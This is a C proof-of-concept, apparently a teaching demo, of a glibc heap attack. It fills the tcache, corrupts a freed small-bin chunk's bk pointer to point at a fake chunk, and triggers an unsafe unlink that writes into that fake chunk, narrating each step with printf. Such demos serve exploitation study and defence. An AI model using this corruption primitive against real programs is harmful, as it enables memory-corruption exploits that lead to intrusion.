#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

#define TCACHE_FILL_COUNT 7
typedef struct tcache_entry
{
    struct tcache_entry *next;
} tcache_entry;

struct malloc_chunk {
	size_t prev_size;
	size_t size;
	struct {
		struct malloc_chunk *fd;
		union {
			struct malloc_chunk *bk;
			char buf[100];
		};
	};
};

#define mem2chunk(m) \
	( (struct malloc_chunk*)((char*)m - offsetof(struct malloc_chunk, fd)) )
#define chunk2mem(c) \
	( (void*)((char*)c + offsetof(struct malloc_chunk, fd)) )

#define size2request(sz) (sz - 2*sizeof(size_t))
int main(void)
{
	struct malloc_chunk evil;
	printf("Unlink attack - while taking a chunk from small bin, the other same size chunks from the corresponding bin would be used to fill the appropriate tcache bin with **unsafe unlink** until the corresponding bin is empty or the tcache bin is full\n");

	printf("\nFirst fill up tcache bin and put enough chunks to small bin\n"
		   " - at least TCACHE_FILL_COUNT+2 chunks\n"
		   "   * TCACHE_FILL_COUNT for filling up tcache\n"
		   "   * 1 for allocating out from small bin\n"
		   "   * 1 for putting at the tail of small bin\n");
	char *tcache[TCACHE_FILL_COUNT], *small[TCACHE_FILL_COUNT+2];
	for (int i = 0; i < TCACHE_FILL_COUNT; ++i) 
		tcache[i] = malloc(0xc0); // chunks in tcache won't be consolidated.
	for (int i = 0; i < TCACHE_FILL_COUNT+2; ++i) 
	{
		malloc(0x10); // prevent from consolidating
		small[i] = malloc(0xc0);
	}
	for (int i = 0; i < TCACHE_FILL_COUNT; ++i)
		free(tcache[i]);
	for (int i = 0; i < TCACHE_FILL_COUNT+2; ++i)
		free(small[i]);

	printf("\nNow we hope victim is the lastest chunk to be unlinked from small bin to tcache or it would corrupt.\n");
	struct malloc_chunk *victim = mem2chunk(small[TCACHE_FILL_COUNT]);
	// bck->fd = bin;
	victim->bk = (void*)&evil;
	
	printf("\nAnd the result is similar to unsorted bin attack\n");
	printf(" Before unlink : %p\n", evil.fd);
	// clean tcache
	for (int i = 0; i < TCACHE_FILL_COUNT; ++i) 
		malloc(0xc0);
	// take from small bin to trigger cache filling
	malloc(0xc0);
	printf(" After unlink : %p\n", evil.fd);
	
	return 0;
}
